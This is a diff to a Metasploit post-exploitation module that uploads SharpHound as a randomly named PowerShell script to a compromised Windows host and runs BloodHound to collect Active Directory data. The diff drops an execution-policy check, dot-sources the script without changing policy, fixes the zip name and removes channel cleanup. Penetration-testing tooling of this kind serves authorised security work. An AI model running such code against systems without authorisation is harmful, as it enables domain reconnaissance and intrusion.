@@ -68,18 +68,18 @@ class MetasploitModule < Msf::Post
 
   def disk_run
     # first test if we can bypass execution policy, aka we're an admin. If not, no reason to continue
-    vprint_status('Testing if we can bypass the execution policy')
-    process, _pid, _c = execute_script("Set-ExecutionPolicy RemoteSigned")
-    sleep 2
-    line = process.channel.read
-    if line =~ /System\.UnauthorizedAccessException/
-      fail_with(Failure::BadConfig, "Admin privileges required for Method disk.  Try Method download if connectivity exists.")
-    end
+    #vprint_status('Testing if we can bypass the execution policy')
+    #process, _pid, _c = execute_script("Set-ExecutionPolicy RemoteSigned")
+    #sleep 2
+    #line = process.channel.read
+    #if line =~ /System\.UnauthorizedAccessException/
+    #  fail_with(Failure::BadConfig, "Admin privileges required for Method disk.  Try Method download if connectivity exists.")
+    #end
 
     name = "#{pwd}\\#{Rex::Text.rand_text_alpha_lower(4..10)}.ps1"
     vprint_status "Uploading sharphound.ps1 as #{name}"
     upload_file(name, sharphound)
-    return "Set-ExecutionPolicy unrestricted; import-module #{name}", name
+    return ". #{name}", name
   end
 
   def run
@@ -154,7 +154,7 @@ class MetasploitModule < Msf::Post
     elsif datastore['Method'] == 'disk'
       command, filename = disk_run
     end
-    invoker = "Invoke-BloodHound -JSONFolder \"#{tmp_path}\" #{extra_params}"
+    invoker = "Invoke-BloodHound -JSONFolder \"#{tmp_path}\" -ZipFileName hello #{extra_params}"
     print_status("Loading BloodHound with: #{command}")
     print_status("Invoking BloodHound with: #{invoker}")
     process, _pid, _c = execute_script("#{command}; #{invoker}")
@@ -181,9 +181,6 @@ class MetasploitModule < Msf::Post
           break
         end
     end
-
-    process.channel.close
-    process.close
 
     if datastore['Method'] == 'disk'
       vprint_status "Deleting #{filename}"
